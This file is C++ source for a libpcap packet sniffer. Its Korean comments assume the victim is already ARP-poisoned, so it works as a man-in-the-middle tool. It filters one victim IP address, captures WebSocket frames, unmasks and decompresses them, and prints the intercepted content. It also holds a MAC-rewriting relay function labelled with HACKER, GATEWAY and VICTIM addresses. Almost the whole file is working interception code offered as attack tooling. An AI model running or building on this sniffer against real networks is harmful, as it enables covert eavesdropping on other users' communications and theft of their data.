#include <cstdio>
#include <pcap.h>
#include <cstring>
#include<stdlib.h>
#include <net/ethernet.h>
#include <signal.h>
#include <zlib.h>
#include <assert.h>

int check_protocol(const u_char *payload, const u_int payload_len);
int unmask_data(u_char *buf, const u_int buf_len);
int decompress_data(u_char *source, int src_len, u_char *result, int &result_len);

typedef unsigned char u_char;

#define HTTP 1
#define WEB_SOCKET 2
#define CHUNK 16384


const u_char HACKER_MAC[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //hacker mac address
const u_char GATEWAY_MAC[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //gateway mac address
const u_char VICTIM_MAC[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //victim mac address


const char TARGET_DEV_NAME[5] = "en0";
const char VICTIM_IP_FILTER[] = "ip host 3.34.244.189 and tcp"; // private ip address
pcap_t *handle;

void pkt_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void sig_handler(int sig);

int main()
{
    // arp 감염이 되어있다고 가정
    // 패킷을 받은 것을 relay해주는 기능 먼저 개발

    //받은 ethernet packet 감지
    pcap_if_t *alldevs;
    pcap_if_t *dev;

    char device[5];
    char error_buf[PCAP_ERRBUF_SIZE];
    // pcap_t *handle;
    const u_char *packet;
    struct pcap_pkthdr packet_header;
    int packet_cout_limit = 1;
    int timeout_limit = 1000;
    int total_packet_count = 0;

    bpf_u_int32 subnet_mask, ip;


    // filter
    struct bpf_program filter;

    //find device
    if(pcap_findalldevs(&alldevs, error_buf) < 0) {
        printf("no device found.. \n");
        return 0;
    }

    for (dev = alldevs ; dev ; dev = dev -> next) {
        printf("장비 : %s \n", dev->name);
        if(!strcmp(dev->name, TARGET_DEV_NAME)) {
            printf("device found : %s \n", dev->name);
            strcpy(device, dev->name);
            break;
        }
    }
    if(dev == NULL) {
        printf("device named %s not found ..\n", TARGET_DEV_NAME);
        return 0;
    }


    handle = pcap_open_live(device, BUFSIZ, packet_cout_limit, timeout_limit, error_buf);

    if(handle == NULL) {
        printf("error on pcap_open_live : %s \n", error_buf);
    }

    if(pcap_compile(handle, &filter, VICTIM_IP_FILTER, 0, ip) == -1) {
        printf("Bad filter.. \n");
        return 2;
    }

    if(pcap_setfilter(handle, &filter) == -1) {
        printf("error setting filter.. \n");
        return 2;
    }

    // sig handler 등록
    signal(SIGINT, sig_handler);

    // handler 등록하고 패킷 캡쳐 시작
    pcap_loop(handle, total_packet_count, pkt_handler, NULL);
    pcap_close(handle);

}

// handle event when packet sent by victim is captured
void pkt_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct ether_header *eth_header;
    eth_header = (struct ether_header *) packet;
    if(ntohs(eth_header->ether_type) != ETHERTYPE_IP) {
        //skip
        return;
    }

    const u_char *ip_header;
    const u_char *tcp_header;
    const u_char *payload;

    const int ethernet_header_length = 14;
    int ip_header_length;
    int tcp_header_length;
    int payload_length;

    ip_header = packet + ethernet_header_length;
    ip_header_length = ((*ip_header) & 0x0F);
    ip_header_length = ip_header_length * 4;
    // printf("IP header length (IHL) in bytes : %d\n", ip_header_length);

    u_char protocol = *(ip_header + 9);
    if (protocol != IPPROTO_TCP) {
        printf("Not a TCP packet. Skipping...\n");
        return;
    }

    tcp_header = packet + ethernet_header_length + ip_header_length;

    tcp_header_length = ((*(tcp_header + 12)) & 0xF0) >> 4;

    tcp_header_length = tcp_header_length * 4;

    int total_headers_size = ethernet_header_length + ip_header_length + tcp_header_length;

    payload_length = header->caplen - (total_headers_size);
    payload = packet + total_headers_size;

    if(check_protocol(payload, payload_length) != WEB_SOCKET) {
        // not websocket
        return;
    }

    //unmask websocket data
    u_char unmasked[payload_length];
    memcpy(unmasked, payload, payload_length);
    unmask_data(unmasked, payload_length);

    //decompress websocket payload
    u_char compr_payload[payload_length + 6];
    u_char decompr_payload[payload_length + 6];
    int decomp_len = 0;
    memcpy(compr_payload, unmasked + 6, payload_length);
    compr_payload[0] = compr_payload[0] + 1;
    compr_payload[payload_length] = 0x00;
    compr_payload[payload_length + 1] = 0x00;
    compr_payload[payload_length + 2] = 0xff;
    compr_payload[payload_length + 3] = 0xff;
    compr_payload[payload_length + 4] = 0xff;
    compr_payload[payload_length + 5] = 0xff;

    decompress_data(compr_payload, payload_length + 6, decompr_payload, decomp_len);

    const u_char *data_p = packet + total_headers_size;
    printf("--------new packet -----------\n");
    printf("암호화된 패킷 : \n");
    for(int i = 0 ; i < payload_length ; i ++) {
        printf("%c", *data_p);
        data_p ++;
    }
    printf("\n복호화된 패킷 : \n");
    for(int i = 0 ; i < decomp_len ; i ++) {
        printf("%c", decompr_payload[i]);
    }
    printf("\n");

    u_int packet_size = header->caplen;
    u_char buf[packet_size + 1];
    memcpy((void*)buf, packet, packet_size);

    // gateway로 패킷 전송
    // int result = send_packet(buf, packet_size, GATEWAY_MAC);
    // if(result == -1) {
    //     // packet 전송 실패
    //     printf("sending packet failed..\n");
    // }
    //printf("packet sent to %x.%x.%x.%x.%x.%x : %d \n", *buf, *(buf+1), *(buf+2), *(buf+3), *(buf+4), *(buf+5),snd_result);

    // mac 주소로 타겟 확인
    // if(memcmp(VICTIM_MAC, buf + 6, 6)){
    //     printf("공격 대상의 mac 주소와 일치하지 않습니다. %x %x %x %x %x %x\n", *VICTIM_MAC, *(VICTIM_MAC + 1), *(VICTIM_MAC + 2), *(VICTIM_MAC + 3), *(VICTIM_MAC + 4), *(VICTIM_MAC + 5));
	// 	for(int i = 0 ; i < 6 ; i ++) {
	// 		printf("%c", *(buf+6+i));
	// 	}
	// 	printf("\n");
	// 	printf("%s \n", VICTIM_MAC)송
	// 	return;
    // }
    
}

// sigint시 종료해야 하는 작업들 처리
void sig_handler(int sig)
{
    printf("good bye..\n");
    pcap_close(handle);
    exit(0);
}

int send_packet(u_char *packet, u_int packet_size, const u_char *mac_addr) 
{
    // mac주소 변경
    memcpy((void*)packet, GATEWAY_MAC, 6);
    memcpy((void*)(packet + 6), HACKER_MAC, 6);

    //send packet
    return pcap_inject(handle, packet, packet_size);
}


int check_protocol(const u_char *payload, const u_int payload_len) 
{
    if(!strncmp((char*)payload, "GET", 3)) {
        // check GET
        return HTTP;
    }
    if(!strncmp((char*)payload, "POST", 4)) {
        // check POST
        return HTTP;
    }
    if((payload[0] & 0xff) == 0xc1) {
        // check websocket
        return WEB_SOCKET;
    }
    return false;
}

int decompress_data(u_char *source, int src_len, u_char *result, int &result_len) {
    int ret;
    unsigned have;
    z_stream z_strm;
    unsigned char in[CHUNK];
    unsigned char out[CHUNK];

    /* allocate inflate state */
    z_strm.zalloc = Z_NULL;
    z_strm.zfree = Z_NULL;
    z_strm.opaque = Z_NULL;
    z_strm.avail_in = 0;
    z_strm.next_in = Z_NULL;
    ret = inflateInit2(&z_strm, -15);
    if (ret != Z_OK) return ret;

    /* decompress until deflate stream ends or end of file */
    u_char *decompr_payload = NULL;
    u_int decompr_len = 0;
    u_int compr_len, decompr_buf_len;
    u_char *compr_payload, *decompr_buf;
    u_int err;

    compr_len = src_len;
    compr_payload = (u_char *)malloc(sizeof(u_char) * compr_len);
    memcpy(compr_payload, source, compr_len );
    decompr_buf_len = 2 * compr_len;
    decompr_buf = (u_char *)malloc(sizeof(u_char) * decompr_buf_len);

    z_strm.next_in = compr_payload;
    z_strm.avail_in = compr_len;
    /* Decompress all available data. */
    do {
        z_strm.next_out = decompr_buf;
        z_strm.avail_out = decompr_buf_len;

        err = inflate(&z_strm, Z_SYNC_FLUSH);

        if (err == Z_OK || err == Z_STREAM_END || err == Z_BUF_ERROR) {
            u_int avail_bytes = decompr_buf_len - z_strm.avail_out;
            if (avail_bytes) {
                decompr_payload = (u_char *)realloc(decompr_payload, decompr_len + avail_bytes);
                memcpy(&decompr_payload[decompr_len], decompr_buf, avail_bytes);
                decompr_len += avail_bytes;
            }
        }
    } while (err == Z_OK);

    memcpy(result, decompr_payload, decompr_len);
    result_len = decompr_len;

    /* clean up and return */
    (void)inflateEnd(&z_strm);
    return ret == Z_STREAM_END ? Z_OK : Z_DATA_ERROR;
}

/* report a zlib or i/o error */
void zerr(int ret) {
    fputs("zpipe: ", stderr);
    switch (ret) {
        case Z_ERRNO:
            if (ferror(stdin)) fputs("error reading stdin\n", stderr);
            if (ferror(stdout)) fputs("error writing stdout\n", stderr);
            break;
        case Z_STREAM_ERROR:
            fputs("invalid compression level\n", stderr);
            break;
        case Z_DATA_ERROR:
            fputs("invalid or incomplete deflate data\n", stderr);
            break;
        case Z_MEM_ERROR:
            fputs("out of memory\n", stderr);
            break;
        case Z_VERSION_ERROR:
            fputs("zlib version mismatch!\n", stderr);
    }
}

int unmask_data(u_char *buf, const u_int buf_len)
{
    u_char payload_length = *(buf + 1) & 0x7f;
    u_char mask[4];
    int payload_start;


    if(payload_length < 126) {
        for(int i = 0 ; i < 4 ; i ++) {
            mask[i] = *(buf + i + 2);
        }
        payload_start = 6;
    }
    else if(payload_length == 126) {
        printf("길이 너무 김..\n");
        return -1;
    }
    else {
        printf("길이 너무 김..\n");
        return -1;
    }

    // unmask payload
    for(int i = 0 ; i < payload_length ; i ++) {
        buf[i + payload_start] = buf[i + payload_start] ^ mask[i % 4];
    }

    return 1;
}